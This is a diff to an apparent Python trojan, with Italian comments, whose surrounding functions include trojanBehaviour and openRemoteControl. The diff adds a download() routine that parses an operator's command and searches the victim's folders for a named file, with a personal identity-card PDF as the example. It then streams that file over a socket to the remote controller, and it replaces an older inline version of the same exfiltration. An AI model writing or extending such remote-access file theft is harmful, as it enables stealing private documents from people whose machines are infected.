@@ -71,6 +71,91 @@ def trojanBehaviour():
             print("              --------------------------------------------------------- ")
 
 
+def download(comando,client):
+
+    counter_virgolette=0
+    counter_spazi=0
+    inizio_file=0
+    fine_file=0
+    inizio_path=0
+    regex_match='null'
+
+    regex_match = regexcheck_download(comando)
+
+    if regex_match != 'null' and regex_match != 'not matched':
+        if regex_match == 'windowstip1'or regex_match == 'unixtip1':
+            print(f"verifica della regex prima del download: a buon fine e risulta un match per {regex_match}")
+
+            #tipologia 1: (simile a find) download "nomefile.estensione" path
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element+1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+                if comando[element] == " ":
+                    counter_spazi += 1
+                    if counter_spazi >= 2 and counter_virgolette == 2:
+                        inizio_path = element+1
+
+        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
+            print(f"verifica della regex prima del download: a buon fine e risulta un match per {regex_match}")
+
+            #tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element+1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+                if comando[element] == ":" and counter_virgolette == 2:
+                    inizio_path = element + 2
+
+
+        file = comando[inizio_file:fine_file]
+        path = comando[inizio_path:]
+        print(f"Nella download del client risulta il nome del file: {file}")
+        print(f'e il path: {path}')
+
+        filetrovato=False
+        for root, dir, files in os.walk(path):
+            if file in files:
+                filetrovato=True
+                #esegui procedura di download
+                try:
+                    filesize = os.path.getsize(file)
+                    if filesize<=0:
+                        raise Exception
+                    else:
+                        with open(file, 'rb') as f:
+                            time.sleep(4)
+                            line = f.read(1024)
+                            client.send(line)
+                            while (line):
+                                line = f.read(1024)
+                                client.send(line)
+
+                            time.sleep(2)
+                            client.send(("[END]").encode(FORMAT))
+                            f.close()
+                except:
+                    client.send(("[ERROR]").encode(FORMAT))
+
+        if filetrovato == True:
+            print("il file è stato trovato")
+        else:
+            print("il file non è stato trovato")
+    else:
+        print("Al client è arrivata una regex che non fa match")
+
+
+
+
+
+
+
 # OK creazione file con tutti i tipi di tipologia
 def filespath(tipologia, client):
     time.sleep(4)
@@ -282,25 +367,8 @@ def openRemoteControl(client):
                 client.send(((infos)).encode(FORMAT))
 
             elif comando[0:8] == "download":
-                try:
-                    filename = comando[10:len(comando) - 1]
-                    filesize = os.path.getsize(filename)
-                    if filesize<=0:
-                        raise Exception
-                    else:
-                        with open(filename, 'rb') as f:
-                            time.sleep(4)
-                            line = f.read(1024)
-                            client.send(line)
-                            while (line):
-                                line = f.read(1024)
-                                client.send(line)
 
-                            time.sleep(2)
-                            client.send(("[END]").encode(FORMAT))
-                            f.close()
-                except:
-                    client.send(("[ERROR]").encode(FORMAT))
+                download(comando,client)
 
                 time.sleep(3)
 
